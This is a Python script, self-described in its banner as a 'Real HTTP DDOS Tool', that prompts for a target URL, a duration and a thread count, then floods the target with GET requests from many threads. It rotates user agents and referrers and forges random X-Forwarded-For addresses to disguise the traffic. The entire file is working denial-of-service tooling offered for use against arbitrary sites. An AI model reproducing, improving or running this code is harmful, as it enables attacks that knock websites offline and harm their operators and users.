#!/usr/bin/env python3
import threading
import requests
import random
import time
import sys
import os

# COLORS
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
WHITE = '\033[97m'
YELLOW = '\033[93m'
RESET = '\033[0m'

# USER AGENTS & REFERRERS
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 10; Infinix)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)"
]

referrers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://duckduckgo.com/"
]

# Banner
def banner():
    os.system("clear")
    print(GREEN + r"""
   ▄████▄   ▒█████   ██▀███   ▒█████   ▓█████  ██▓    
  ▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▒  ██▒ ▓█   ▀ ▓██▒    
  ▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒▒██░  ██▒ ▒███   ▒██░    
  ▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ▒██   ██░ ▒▓█  ▄ ▒██░    
  ▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░ ████▓▒░ ░▒████▒░██████▒
  ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░▒░▒░  ░░ ▒░ ░░ ▒░▓  ░
    ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░  ░ ▒ ▒░   ░ ░  ░░ ░ ▒  ░
  ░        ░ ░ ░ ▒    ░░   ░ ░ ░ ░ ▒      ░     ░ ░   
  ░ ░          ░ ░     ░         ░ ░      ░  ░    ░   

     Real HTTP DDOS Tool | Coded by DARK-OMNEX963
""" + RESET)

# Perform HTTP Flood
def http_flood(target_url, duration, thread_id):
    timeout = time.time() + duration
    sent = 0

    while time.time() < timeout:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Referer": random.choice(referrers),
                "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
            }
            response = requests.get(target_url, headers=headers, timeout=3)
            sent += 1
            status = response.status_code
            print(f"{GREEN}[Thread-{thread_id}] Sent ➤ {target_url} | Status: {status} | Count: {sent}{RESET}")
        except requests.exceptions.RequestException:
            print(f"{RED}[Thread-{thread_id}] Connection Failed or Timed Out.{RESET}")

# Main Start
def start_attack():
    banner()

    target_url = input(CYAN + "[?] Enter target URL (with http/https): " + RESET)
    duration = int(input(CYAN + "[?] Duration (in seconds): " + RESET))
    threads = int(input(CYAN + "[?] Number of Threads (recommended 20-50): " + RESET))

    print(f"{YELLOW}\n[+] Launching attack on {target_url} for {duration} seconds using {threads} threads...{RESET}\n")
    time.sleep(2)

    for i in range(threads):
        thread = threading.Thread(target=http_flood, args=(target_url, duration, i+1))
        thread.start()

# Entry Point
if __name__ == "__main__":
    try:
        start_attack()
    except KeyboardInterrupt:
        print(RED + "\n[!] Interrupted by user. Exiting...\n" + RESET)
sys.exit(0)
